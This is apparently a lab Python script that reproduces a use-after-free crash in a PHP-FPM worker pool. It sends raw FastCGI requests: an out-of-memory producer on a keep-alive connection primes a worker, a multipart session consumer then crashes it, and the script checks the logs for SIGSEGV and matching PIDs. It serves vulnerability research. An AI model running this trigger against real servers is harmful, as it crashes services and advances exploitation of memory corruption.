#!/usr/bin/env python3
"""Raw FastCGI A1/A2 pair on a static 2 pool.

C1: producer (keep=1) -> primes worker A; worker A stays in the keep-alive
    read loop, so it is not accepting new connections.
C2: consumer B (keep=0) -> must be accepted by worker B (unprimed) -> 200.
C1: consumer A (keep=0) -> worker A (primed) -> pre-RINIT UAF SIGSEGV.

Control: C1 producer -> ping (keep=1, RINIT clears BG state) -> consumer A
         -> 200, same worker, no crash.
"""
import argparse, json, os, re, socket, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import t3_raw_fcgi as t
import matrix_run as m


def dec_bytes(obj):
    if isinstance(obj, bytes):
        return obj.decode("latin1", "replace")
    if isinstance(obj, dict):
        return {k: dec_bytes(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [dec_bytes(v) for v in obj]
    return obj


def send(sock, req, seconds=3.0):
    try:
        sock.sendall(req)
    except Exception as e:
        return {"send_error": "%s: %s" % (type(e).__name__, e), "data": b"", "responses": {}}
    try:
        data = t.recv_all(sock, seconds=seconds)
    except Exception as e:
        return {"recv_error": "%s: %s" % (type(e).__name__, e), "data": b"", "responses": {}}
    try:
        res = t.parse_responses(data, ids=(1, 2, 3))
    except Exception as e:
        res = {"parse_error": "%s: %s" % (type(e).__name__, e)}
    return {"data": data, "responses": res}


def read_new(path, offset):
    try:
        with open(path, "rb") as f:
            f.seek(offset)
            return f.read().decode("latin1", "replace")
    except FileNotFoundError:
        return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=29510)
    ap.add_argument("--type", choices=["decode", "encode"], required=True)
    ap.add_argument("--tag", required=True)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--control-ping", action="store_true")
    ap.add_argument("--access-log", default=m.RUN + "/lab/logs/fpm-s2-access.log")
    ap.add_argument("--error-log", default=m.RUN + "/lab/logs/fpm-s2-error.log")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    os.makedirs(m.SESSION_DIR, exist_ok=True)
    off_a = os.path.getsize(args.access_log) if os.path.exists(args.access_log) else 0
    off_e = os.path.getsize(args.error_log) if os.path.exists(args.error_log) else 0

    safe = re.sub(r"[^A-Za-z0-9,-]", "", args.tag)
    sid_a = "m%s-a" % safe  # same-worker consumer
    sid_b = "m%s-b" % safe  # cross-worker consumer
    payload = m.DECODE_SESSION if args.type == "decode" else m.ENCODE_SESSION
    for sid in (sid_a, sid_b):
        with open(os.path.join(m.SESSION_DIR, "sess_" + sid), "wb") as f:
            f.write(payload)

    producer_script = "producer_oom.php" if args.type == "decode" else "producer_ser_oom.php"
    n = 8000000 if args.type == "decode" else 300000
    result = {"tag": args.tag, "type": args.type, "port": args.port, "control_ping": args.control_ping,
              "sid_a": sid_a, "sid_b": sid_b}

    # ---- connection C1: producer (keep-alive) ----
    c1 = t.connect(args.port)
    env = t.get_env(producer_script, "/" + producer_script)
    env["QUERY_STRING"] = "n=%d&tag=%sprod" % (n, args.tag)
    r = send(c1, t.build_request(1, env, keep=True), seconds=2.5)
    result["producer"] = {"error": r.get("send_error") or r.get("recv_error"),
                          "responses": dec_bytes(r["responses"])}

    # ---- connection C2: consumer B on a different worker ----
    body_b = m.build_consumer_body(sid_b, "key_%s_b" % args.tag)
    env_b = t.get_env("consumer.php", "/consumer.php", method="POST",
                      content_type="multipart/form-data; boundary=" + m.BOUNDARY,
                      content_length=len(body_b))
    env_b["QUERY_STRING"] = "tag=%scB" % args.tag
    c2 = t.connect(args.port)
    r2 = send(c2, t.build_request(1, env_b, body=body_b, keep=False), seconds=3.0)
    c2.close()
    result["consumer_cross"] = {"error": r2.get("send_error") or r2.get("recv_error"),
                                "responses": dec_bytes(r2["responses"])}

    # ---- optional control: ping on C1 clears BG state ----
    if args.control_ping:
        env_p = t.get_env("ping.php", "/ping.php")
        env_p["QUERY_STRING"] = "tag=%sping" % args.tag
        rp = send(c1, t.build_request(2, env_p, keep=True), seconds=2.0)
        result["control_ping_resp"] = {"error": rp.get("send_error") or rp.get("recv_error"),
                                       "responses": dec_bytes(rp["responses"])}
        next_id = 3
    else:
        next_id = 2

    # ---- connection C1: consumer A on the pinned/primed worker ----
    body_a = m.build_consumer_body(sid_a, "key_%s_a" % args.tag)
    env_a = t.get_env("consumer.php", "/consumer.php", method="POST",
                      content_type="multipart/form-data; boundary=" + m.BOUNDARY,
                      content_length=len(body_a))
    env_a["QUERY_STRING"] = "tag=%scA" % args.tag
    ra = send(c1, t.build_request(next_id, env_a, body=body_a, keep=False), seconds=3.0)
    try:
        c1.close()
    except Exception:
        pass
    result["consumer_same"] = {"error": ra.get("send_error") or ra.get("recv_error"),
                               "requests_id": next_id, "responses": dec_bytes(ra["responses"])}
    time.sleep(0.4)

    access = read_new(args.access_log, off_a)
    error = read_new(args.error_log, off_e)
    open(os.path.join(args.outdir, "access_new.txt"), "w").write(access)
    open(os.path.join(args.outdir, "error_new.txt"), "w").write(error)
    rows = m.parse_fpm_access(access)
    result["access_rows"] = rows
    result["sig11_pids"] = m.parse_sig11(error)

    def find_pid(tag):
        for row in rows:
            if tag in row["query"]:
                return row["pid"]
        return None
    result["producer_pid"] = find_pid("tag=%sprod" % args.tag)
    result["cross_pid"] = find_pid("tag=%scB" % args.tag)
    result["same_pid"] = find_pid("tag=%scA" % args.tag)
    result["cross_differs_from_producer"] = (result["cross_pid"] is not None and
                                             result["producer_pid"] is not None and
                                             result["cross_pid"] != result["producer_pid"])
    result["same_matches_producer"] = (result["same_pid"] == result["producer_pid"] and
                                       result["producer_pid"] is not None)
    result["same_crash_matches_producer"] = (result["producer_pid"] in result["sig11_pids"]) if result["producer_pid"] else False

    # extract PIDs reported by the consumer scripts
    def body_pid(resp):
        out = resp.get("stdout", "")
        mm = re.search(r"CONSUMER PID=(\d+)", out)
        return int(mm.group(1)) if mm else None
    result["cross_body_pid"] = body_pid(result["consumer_cross"]["responses"].get(1, {}))
    result["same_body_pid"] = body_pid(result["consumer_same"]["responses"].get(next_id, {}))

    with open(os.path.join(args.outdir, "result.json"), "w") as f:
        json.dump(result, f, indent=2)
    summary = {k: result[k] for k in ("tag", "type", "producer_pid", "cross_pid", "cross_body_pid",
                                      "same_pid", "same_body_pid", "sig11_pids",
                                      "cross_differs_from_producer", "same_matches_producer",
                                      "same_crash_matches_producer")}
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
